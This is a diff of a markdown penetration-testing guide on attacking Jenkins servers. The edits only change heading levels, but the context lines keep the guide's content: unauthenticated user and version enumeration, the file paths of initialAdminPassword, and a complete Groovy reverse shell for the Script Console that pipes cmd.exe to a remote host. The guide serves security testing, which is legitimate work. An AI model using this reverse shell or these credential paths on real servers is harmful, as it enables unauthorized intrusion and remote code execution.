@@ -2,17 +2,17 @@
 title: Jenkins
 ---
 
-# Introduction
+## Introduction
 
 Jenkins is a free and open source automation server. It helps automate the parts of software development related to building, testing, and deploying, facilitating continuous integration and continuous delivery. It is a server-based system that runs in servlet containers such as Apache Tomcat.
 
 ![Jenkins Login.](../images/jenkins.png)
 
-# Enumeration
+## Enumeration
 
 We can obtain a some valuable information without necessarily log in on the server.
 
-## Jenkins Version
+### Jenkins Version
 
 Visit the following route to obtain the Jenkins version on the footer page.
 
@@ -23,7 +23,7 @@ Visit the following route to obtain the Jenkins version on the footer page.
 Page generated: Sep 27, 2021 12:46:28 PM PDTREST APIJenkins ver. 2.204.1
 ```
 
-## Users
+### Users
 
 Without credentials it is possible to obtain some users.
 
@@ -35,7 +35,7 @@ Without credentials it is possible to obtain some users.
 /securityRealm/user/admin/search/index?q=
 ```
 
-# Credentials
+## Credentials
 
 There are no default credentials but some times these works.
 
@@ -71,11 +71,11 @@ C:\Program Files (x86)\Jenkins\secrets\initialAdminPassword
 C:\Program Files\Jenkins\secrets\initialAdminPassword
 ```
 
-# From Admin to Reverse Shell
+## From Admin to Reverse Shell
 
 There are multiple ways in which from administrative privileges in Jenkins you can get a reverse shell.
 
-## Script Console
+### Script Console
 
 To obtain a Reverse shell we need to execute **`Manage Jenkins`** on **`Script Console.`**
 
@@ -94,7 +94,7 @@ proc.waitForOrKill(1000)
 println "out> $sout err> $serr"
 ```
 
-### Windows Reverse Shell
+#### Windows Reverse Shell
 
 ```
 String host="<IP-ADDR>";
@@ -103,7 +103,7 @@ String cmd="cmd.exe";
 Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
 ```
 
-### Linux Reverse Shell
+#### Linux Reverse Shell
 
 First we need to craft the payload.
 
@@ -122,7 +122,7 @@ proc.waitForOrKill(1000)
 println "out> $sout err> $serr"
 ```
 
-## Freestyle Project
+### Freestyle Project
 
 We can create a new project or see if we can modify the configuration of an existant project.
 
